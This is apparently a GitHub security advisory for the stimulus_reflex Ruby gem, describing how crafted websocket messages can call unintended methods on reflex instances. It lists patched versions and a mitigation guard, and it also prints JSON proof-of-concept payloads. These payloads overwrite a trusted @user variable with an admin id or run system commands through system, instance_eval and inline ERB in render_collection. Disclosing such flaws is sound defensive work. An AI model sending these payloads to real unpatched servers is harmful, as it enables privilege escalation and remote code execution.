# Arbitrary method call on reflexes

High

[marcoroth](/marcoroth)

GHSA-f78j-4w3g-4q65
Mar 12, 2024

## Package

bundler

stimulus\_reflex
([RubyGems](/advisories?query=ecosystem%3Arubygems))

## Affected versions

<= 3.4.1, <= 3.5.0.rc3

## Patched versions

3.4.2, 3.5.0.rc4

## Description

### Summary

More methods than expected can be called on reflex instances. Being able to call some of them has security implications.

### Details

To invoke a reflex a websocket message of the following shape is sent:

```
{
  "target": "[class_name]#[method_name]",
  "args": []
}
```

The server will proceed to instantiate `reflex` using the provided `class_name` as long as it extends `StimulusReflex::Reflex`.

It then attempts to call `method_name` on the instance with the provided arguments [ref](https://github.com/stimulusreflex/stimulus_reflex/blob/0211cad7d60fe96838587f159d657e44cee51b9b/app/channels/stimulus_reflex/channel.rb#L83):

```
method = reflex.method method_name
required_params = method.parameters.select { |(kind, _)| kind == :req }
optional_params = method.parameters.select { |(kind, _)| kind == :opt }

if arguments.size >= required_params.size && arguments.size <= required_params.size + optional_params.size
  reflex.public_send(method_name, *arguments)
end
```

This is problematic as `reflex.method(method_name)` can be more methods than those explicitly specified by the developer in their reflex class. A good example is the `instance_variable_set` method.

Let's imagine a reflex that uses `@user` as a trusted variable in an `after\_reflex` callback.

This variable can be overwritten using the following message:

```
{
  "target": "ChatReflex#instance_variable_set",
  "args": ["@user", "<admin-id>"]
}
```

Here are other interesting methods that were found to be available for the [ChatReflex sample reflex](https://github.com/hopsoft/stimulus_reflex_expo/blob/dcce8c36a6782d1e7f57f0e2766a3f6fd770b3b1/app/reflexes/chat_reflex.rb)

* `remote_byebug`: bind a debugging server
* `pry`: drop the process in a REPL session

All in all, only counting `:req` and `:opt` parameters helps.

For example around [version 1.0](https://github.com/stimulusreflex/stimulus_reflex/blob/1f610b636abfed27de2c61104aebd1ac98180d5b/lib/stimulus_reflex/channel.rb#L41) only `.arity` was checked which allowed access to the `system` method (`.arity == -1`)

```
{
  "target": "ChatReflex#system",
  "args": ["[command here]"]
}
```

Using `public_send` instead of `send` does not help but the following payloads **do not** work since `:rest` parameters are not counted in the current version

```
{
  "target": "ChatReflex#send",
  "args": ["system", "[command here]"]
}
```

```
{
  "target": "ChatReflex#instance_eval",
  "args": ["system('[command here]')"]
}
```

Pre-versions of 3.5.0 added a `render_collection` method on reflexes with a `:req` parameter. Calling this method could lead to arbitrary code execution:

```
{
  "target": "StimulusReflex::Reflex#render_collection",
  "args": [
    { "inline":  "<% system('[command here]') %>" }
  ]
}
```
### Patches

Patches are [available on RubyGems](https://rubygems.org/gems/stimulus_reflex) and on [NPM](https://npmjs.org/package/stimulus_reflex).

The patched versions are:

* [`3.4.2`](https://github.com/stimulusreflex/stimulus_reflex/releases/tag/v3.4.2)
* [`3.5.0.rc4`](https://github.com/stimulusreflex/stimulus_reflex/releases/tag/v3.5.0.rc4)

### Workaround

You can add this guard to mitigate the issue if running an unpatched version of the library.

1.) Make sure all your reflexes inherit from the `ApplicationReflex` class

2.) Add this `before_reflex` callback to your `app/reflexes/application_reflex.rb` file:

```
class ApplicationReflex < StimulusReflex::Reflex
  before_reflex do
    ancestors = self.class.ancestors[0..self.class.ancestors.index(StimulusReflex::Reflex) - 1]
    allowed = ancestors.any? { |a| a.public_instance_methods(false).any?(method_name.to_sym) }

    raise ArgumentError.new("Reflex method '#{method_name}' is not defined on class '#{self.class.name}' or on any of its ancestors") if !allowed
  end
end
```

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
